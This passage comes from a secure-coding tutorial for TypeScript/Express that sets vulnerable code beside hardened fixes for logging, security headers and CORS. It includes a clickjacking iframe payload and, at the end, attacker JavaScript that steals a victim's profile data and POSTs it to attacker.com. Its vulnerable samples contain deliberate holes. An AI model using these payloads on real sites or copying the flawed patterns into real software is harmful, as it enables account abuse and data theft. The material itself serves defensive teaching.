     if (typeof input === 'string') {
       return input.replace(/[\r\n]/g, ' ');
     }
     // Redact secrets by key name
     // ...
   }

   logger.error('unhandled_error', {
     id: correlationId,
     message: sanitizeForLog(err?.message),
     stack: ENV === 'development' ? sanitizeForLog(err?.stack) : undefined
   });
   ```
   - Prevents log injection and secret leakage while keeping logs useful.

3. **Rate limiting and minimal responses on sensitive routes**:
   ```typescript
   const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 20 });
   app.post('/api/login', authLimiter, async (req, res, next) => {
     const authError = 'Invalid email or password';
     // same message for all failures
   });
   ```
   - Thwarts brute-force attempts and user enumeration through error message timing.

**Additional Protections**:
- Configure log sinks securely: send structured logs to a centralized, access-controlled system (e.g., SIEM) with encryption at rest and strict RBAC.
- Set security headers with Helmet (already applied) and consider disabling detailed error pages at the reverse proxy (e.g., Nginx) as well.
- Regularly review logs and alerts for abnormal patterns (e.g., repeated login failures, spikes in 5xx errors) and tie correlation IDs into monitoring dashboards for faster incident response.

Relying on default or missing HTTP security headers is dangerous because browsers will allow risky behaviors like iframing, inline scripts, and content sniffing. You should explicitly configure security headers.

**VULNERABLE CODE**:

```typescript
import express, { Request, Response, NextFunction } from 'express';

const app = express();
const PORT = process.env.PORT || 3000;

// Vulnerable: no security headers, default Express behavior
// Some devs even disable the minimal protection Express offers:
app.disable('x-powered-by'); // This is good
// But they forget everything else.

app.get('/api/profile', (req: Request, res: Response) => {
  // Application returns HTML that could be framed or injected
  const username = req.query.username || 'Guest';
  res.send(`
    <html>
      <head><title>Profile</title></head>
      <body>
        <h1>Welcome ${username}</h1>
        <!-- No CSP, no X-Frame-Options, no XSS protection -->
      </body>
    </html>
  `);
});

// Generic error handler without secure headers
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  console.error('Error:', err);
  res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
```

**Attack Payload** (clickjacking using missing frame protections):
```html
<!-- Malicious site controlled by attacker -->
<html>
  <body>
    <iframe
      src="https://victim-app.example.com/api/profile?username=Attacker"
      style="position:absolute;top:0;left:0;opacity:0;z-index:1;width:100%;height:100%;border:0;"
    ></iframe>
    <button
      style="position:absolute;top:100px;left:100px;z-index:2;width:200px;height:50px;"
    >
      Claim your prize
    </button>
  </body>
</html>
```

This payload overlays a visible button on top of the invisible iframe; when the user clicks, they actually click a sensitive button inside your app (e.g., "Delete account", "Transfer funds").

**Why This Is Dangerous**:
- No `X-Frame-Options` or `Content-Security-Policy` allows clickjacking attacks via iframes.
- No `Content-Security-Policy` means any future XSS bug becomes far more powerful (inline scripts, external JS allowed).
- Missing headers like `X-Content-Type-Options` and `Referrer-Policy` increase the blast radius of other bugs (content sniffing, information leakage).

**SECURE VERSION**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';

const app = express();
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Primary defense: use helmet to set sane defaults for security headers
app.disable('x-powered-by');

// Configure Helmet with explicit, strict policies
app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: true,
      directives: {
        // Allow scripts only from self (and disallow inline/eval by default)
        "script-src": ["'self'"],
        // Allow styles only from self (can add 'https://fonts.googleapis.com' if needed)
        "style-src": ["'self'"],
        // Default: only same origin
        "default-src": ["'self'"],
        // Disallow framing to prevent clickjacking
        "frame-ancestors": ["'none'"],
      },
    },
    frameguard: { action: 'deny' },
    referrerPolicy: { policy: 'no-referrer' },
    hsts: NODE_ENV === 'production'
      ? { maxAge: 31536000, includeSubDomains: true, preload: true }
      : false,
  })
);

app.get('/api/profile', (req: Request, res: Response) => {
  const username = String(req.query.username || 'Guest')
    .replace(/[^a-zA-Z0-9_-]/g, ''); // basic output encoding/validation

  res.type('html').send(`
    <html>
      <head><title>Profile</title></head>
      <body>
        <h1>Welcome ${username}</h1>
      </body>
    </html>
  `);
});

// Secure error handler: does not leak stack traces and maintains headers
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  console.error('Error:', err.message);
  if (NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal Server Error' });
  } else {
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT} in ${NODE_ENV} mode`);
});
```

**Key Security Controls**:
- Helmet-based security headers: Enforces `CSP`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, and optionally `HSTS` to mitigate XSS, clickjacking, and downgrade attacks.
- Environment-aware configuration: Enables strict `HSTS` only in production to avoid issues during local development and testing.
- Input validation/output encoding: Sanitizes `username` before embedding into HTML, reducing XSS risk even if CSP is misconfigured later.

In production, you typically want environment-specific security header profiles, structured configuration, strong logging, and monitoring so you can safely iterate (e.g., CSP report-only first, then enforce).

**PRODUCTION PATTERN**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import morgan from 'morgan';
import fs from 'fs';
import path from 'path';

const app = express();
const NODE_ENV = (process.env.NODE_ENV || 'development').toLowerCase();
const PORT = process.env.PORT ? Number(process.env.PORT) : 3000;

// Centralized configuration for headers per environment
type SecurityConfig = {
  enableHsts: boolean;
  cspReportOnly: boolean;
};

const securityConfig: Record<string, SecurityConfig> = {
  development: {
    enableHsts: false,
    cspReportOnly: true, // easier CSP debugging in dev
  },
  staging: {
    enableHsts: false,
    cspReportOnly: true, // collect reports before enforcing
  },
  production: {
    enableHsts: true,
    cspReportOnly: false,
  },
};

const currentSecurity = securityConfig[NODE_ENV] || securityConfig.development;

// Request logging to file for audit and incident response
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir);
}
const accessLogStream = fs.createWriteStream(path.join(logDir, 'access.log'), {
  flags: 'a',
});

app.use(morgan('combined', { stream: accessLogStream }));
app.use(express.json());

app.disable('x-powered-by');

// CSP configuration with report endpoint
const cspDirectives: helmet.ContentSecurityPolicyOptions['directives'] = {
  "default-src": ["'self'"],
  "script-src": ["'self'"],
  "style-src": ["'self'", 'https://fonts.googleapis.com'],
  "font-src": ["'self'", 'https://fonts.gstatic.com'],
  "img-src": ["'self'", 'data:'],
  "connect-src": ["'self'"],
  "frame-ancestors": ["'none'"],
  // report-uri is deprecated in favor of report-to, but some browsers still honor it
  "report-uri": ['/csp-report'],
};

// Helmet with environment-aware CSP and HSTS
app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: true,
      directives: cspDirectives,
      reportOnly: currentSecurity.cspReportOnly,
    },
    frameguard: { action: 'deny' },
    referrerPolicy: { policy: 'no-referrer' },
    xssFilter: true,
    noSniff: true,
    hsts: currentSecurity.enableHsts
      ? { maxAge: 31536000, includeSubDomains: true, preload: true }
      : false,
  })
);

// CSP violation report endpoint for monitoring
app.post('/csp-report', (req: Request, res: Response) => {
  console.warn('CSP Violation Report:', JSON.stringify(req.body));
  // In a real app, forward to SIEM/log aggregation here
  res.status(204).end();
});

// Example secured route
app.get('/api/account', (req: Request, res: Response) => {
  // Business logic goes here. Assume user is authenticated via middleware.
  const account = {
    id: 1,
    owner: 'alice',
    balance: 1000,
  };

  res.json(account);
});

// Central error handler with structured logging
app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  const correlationId = (req.headers['x-correlation-id'] as string) || 'n/a';
  console.error(
    JSON.stringify({
      level: 'error',
      msg: err.message,
      stack: NODE_ENV === 'production' ? undefined : err.stack,
      path: req.path,
      method: req.method,
      correlationId,
    })
  );

  const body = NODE_ENV === 'production'
    ? { error: 'Internal Server Error', correlationId }
    : { error: err.message, stack: err.stack, correlationId };

  res.status(500).json(body);
});

// Graceful degradation: default 404 with safe headers
app.use((req: Request, res: Response) => {
  res.status(404).json({ error: 'Not Found' });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT} (${NODE_ENV})`);
});
```

**Defense in Depth Layers**:
1. **Header hardening and environment profiles**:
   ```typescript
   const currentSecurity = securityConfig[NODE_ENV] || securityConfig.development;
   app.use(
     helmet({
       contentSecurityPolicy: {
         useDefaults: true,
         directives: cspDirectives,
         reportOnly: currentSecurity.cspReportOnly,
       },
       hsts: currentSecurity.enableHsts ? { maxAge: 31536000, includeSubDomains: true, preload: true } : false,
     })
   );
   ```
   This ensures development can iterate safely with `reportOnly`, while production enforces strict CSP and HSTS.

2. **Monitoring and CSP violation reporting**:
   ```typescript
   app.post('/csp-report', (req: Request, res: Response) => {
     console.warn('CSP Violation Report:', JSON.stringify(req.body));
     res.status(204).end();
   });
   ```
   CSP reports highlight attempted injections and misconfigurations, giving visibility into attacks.

3. **Centralized error handling and audit logging**:
   ```typescript
   app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
     const correlationId = (req.headers['x-correlation-id'] as string) || 'n/a';
     console.error(JSON.stringify({
       level: 'error',
       msg: err.message,
       path: req.path,
       method: req.method,
       correlationId,
     }));
     res.status(500).json({ error: 'Internal Server Error', correlationId });
   });
   ```
   This avoids leaking internals while preserving enough context for forensic analysis.

**Additional Protections**:
- Use a reverse proxy or API gateway (e.g., Nginx, Envoy) to enforce TLS, additional headers, and rate limits before traffic hits the app.
- Implement authentication/authorization middleware before sensitive routes, combined with security headers, to prevent session and token abuse.
- Integrate access logs and CSP violation logs with a SIEM (e.g., Splunk, ELK, Datadog) and configure alerts for spikes in CSP violations or 4xx/5xx rates, signaling active exploitation or misconfigurations.

Using `Access-Control-Allow-Origin: *` on an authenticated API is dangerous, especially for cookies or bearer tokens. A misconfigured CORS policy can let any malicious website call your API with the victim's browser credentials.

**VULNERABLE CODE**:

```typescript
import express, { Request, Response } from 'express';
import cors from 'cors';

const app = express();
const PORT = 3000;

// Global middleware
app.use(express.json());

// ❌ DANGEROUS: Allow all origins and credentials
app.use(
  cors({
    origin: '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  })
);

// Example authenticated route
app.get('/api/user/profile', (req: Request, res: Response) => {
  // Pretend we read user from session or JWT
  // No origin checking here, we trust CORS
  res.json({
    id: 123,
    email: 'user@example.com',
    role: 'admin',
    apiKey: 'SECRET-API-KEY-123',
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

**Attack Payload** (malicious site JavaScript):
```javascript
// Hosted on https://evil.example
fetch('https://api.yourcompany.com/api/user/profile', {
  method: 'GET',
  credentials: 'include', // send cookies / auth headers
})
  .then(r => r.json())
  .then(data => {
    // Exfiltrate sensitive data to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
